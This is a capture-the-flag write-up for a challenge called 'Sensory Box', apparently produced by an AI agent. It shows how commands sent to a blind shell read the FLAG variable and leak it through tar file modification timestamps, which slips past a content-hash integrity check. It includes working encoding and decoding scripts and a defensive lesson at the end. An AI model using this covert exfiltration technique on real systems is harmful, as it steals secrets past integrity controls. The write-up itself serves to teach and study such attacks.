# Sensory Box — reading the flag through tar timestamps

[Русская версия](solve.ru.md)

## 1. Read the source before guessing

The challenge first asks for a kCTF proof of work. The game then has six rounds with n-sided dice. The source in `sensory_box.py` chooses sides using `secrets.randbelow` from upper bounds `[10, 1000, 10000, 100000, 65535, 2**32-1]`. Correct guesses yield an `AGE-SECRET-KEY-...` for one encrypted flag slice.

The flag is partitioned into six parts, each encrypted to a fresh X25519 `age` recipient and written to `/boxes/box_XX/prize.age`. A corresponding `dice.txt` contains the number of sides. The process reads `FLAG` from its environment. The final response is base64 of a `tar.xz` containing all 12 files.

Brute-force guessing is not practical, especially for the sixth die. More importantly, the three-second “sensing” stage is executable code:

```python
proc = subprocess.Popen(
    ["/bin/sh"],
    stdout=subprocess.DEVNULL if not DEBUG else None,
    stderr=subprocess.DEVNULL if not DEBUG else None,
    cwd=box_path(dice),
    close_fds=True,
    process_group=0,
)
```

The shell inherits stdin and `FLAG`; output descriptors are discarded. Thus commands sent during the `GO!` window execute blindly. The runner drains pending input after terminating the shell, so the actual number guess must be supplied **after** `What is your guess?`.

## 2. Find an observable effect

A test command `touch pwned` altered a box and resulted in `Hey, thief, give me my dice back!`. This proved code execution, but also demonstrated a final integrity check:

```python
def get_boxes_content():
    return subprocess.check_output(
        "find /boxes -type f | sort | xargs sha256sum", shell=True
    )

boxes_content = get_boxes_content()
# ... six rounds ...
if boxes_content != get_boxes_content():
    print("Hey, thief, give me my dice back!")
    exit(1)
```

This compares names and **content hashes**, not metadata. Changing file contents or adding a new file blocks bundle delivery. Changing `mtime` with `os.utime`, however, leaves SHA-256 unchanged.

The runner eventually builds the archive with:

```python
tarball = subprocess.check_output(["tar", "cJ"] + files)
print(base64.b64encode(tarball).decode())
```

Tar member headers include modification timestamps. We can therefore carry attacker-chosen 32-bit integers out of the sandbox without changing a single file's content.

## 3. Encode the flag as timestamps

There are **12 files**, six `dice.txt` and six `prize.age`. Encode four flag bytes into each mtime as a big-endian unsigned integer. The resulting 48-byte capacity is enough for the 40-byte live flag:

```python
import os

paths = [f"/boxes/box_{i:02d}/dice.txt" for i in range(1, 7)]
paths += [f"/boxes/box_{i:02d}/prize.age" for i in range(1, 7)]
flag = os.environ["FLAG"].encode()

for i, path in enumerate(paths):
    part = flag[4*i:4*i+4].ljust(4, b"\0")
    os.utime(path, (0, int.from_bytes(part, "big")))
```

Wrap the program in a shell `python3 - <<'PY'` heredoc and send it immediately after the first `GO!`. It must execute within the three-second shell lifetime; the historical exploit sent it promptly and slept 2.5 seconds.

An independent marker experiment wrote `1000000+i` as mtime in this same order. All twelve numbers reappeared in the downloaded tar, proving the channel before the actual secret was extracted.

## 4. Finish with wrong guesses, then decode

After the blind command is delivered, send a wrong guess such as `0` at each **post-window** prompt. No keys are needed: the server still returns the archive of encrypted slices and dice files after six rounds, provided the hashes match.

Decode base64 → XZ → tar and index members by **full path**. Do **not** concatenate entries in tar order: the archive interleaves `dice.txt` and `prize.age` by box, but our encoding writes all six dice timestamps first and all six prize timestamps second. This was a real bug in the first decoding attempt.

```python
import base64, io, lzma, tarfile

data = lzma.decompress(base64.b64decode(encoded_bundle))
with tarfile.open(fileobj=io.BytesIO(data)) as archive:
    mtimes = {member.name: member.mtime for member in archive}

paths = [f"boxes/box_{i:02d}/dice.txt" for i in range(1, 7)]
paths += [f"boxes/box_{i:02d}/prize.age" for i in range(1, 7)]
flag = b"".join(mtimes[p].to_bytes(4, "big") for p in paths).rstrip(b"\0")
```

The last two four-byte words in the successful trace were zero-padded. The complete output matched the `gctf{...}` format, and the agent retained the literal recovered value in private `FLAG.txt`.

## 5. Other approaches and why they were dropped

- In an early session, guessing `6` for the first die worked. A one-off `age` identity decrypted box 1 to `gctf{70`, confirming the prize structure.
- The theory that an `age` key could be deterministically derived from `n`, from Python RNG, SHA/KDF formulas, or prior sessions was rejected. The same six-sided die yielded different secret keys in separate sessions.
- Timing analysis of the blind three-second period showed no reliable dependence on the die count; small prompt timing anomalies did not reproduce.
- The earliest chat proposed `printf ... "$FLAG" >&0`. Live tests found no outgoing bytes: stdin was not a usable bidirectional return channel. Writes to `/proc/$PPID/fd/1` failed in the sandbox (Docker config includes `--disable_proc`).
- Early input could be discarded by the post-shell drain. The final code waits for prompts before submitting all six guesses.
- Altering file contents triggers the integrity check, but `mtime` survives it.

## 6. Evidence and validation

The participant's private `glacierctf_sensory_box_materials.zip` contains the original `sensory_box.tar.gz`, the exact final exploit `scripts/leak_via_mtime2.py`, a portable copy `scripts/solve_final_portable.py`, intermediate scripts and transcribed output.

The decisive preserved output shows twelve timestamp values converted back to four-byte chunks; concatenating them yields a 40-byte `gctf{...}` value. For instance the first two entries were:

```text
boxes/box_01/dice.txt 1734571110 b'gctf'
boxes/box_02/dice.txt 2067214453 b'{70u'
```

The full recovered value is masked in GitHub and retained in the private archive. **The archive explicitly says that submission to the CTF platform was not performed or recorded**; we therefore claim successful live extraction, not a platform acceptance screenshot. The successful compressed tar was not saved separately, but the agent preserved the reconstructed stdout.

## 7. Security lesson

The trust boundary was crossed when the game intentionally spawned an unprivileged-but-secret-bearing shell, then treated “no stdout” and a content-only integrity check as sufficient isolation. Metadata written by that shell became an output channel when the server serialized it with `tar`. A defense must remove the secret from the sensing process, restrict shell capabilities, or normalize and regenerate archive metadata rather than relying on content hashes.
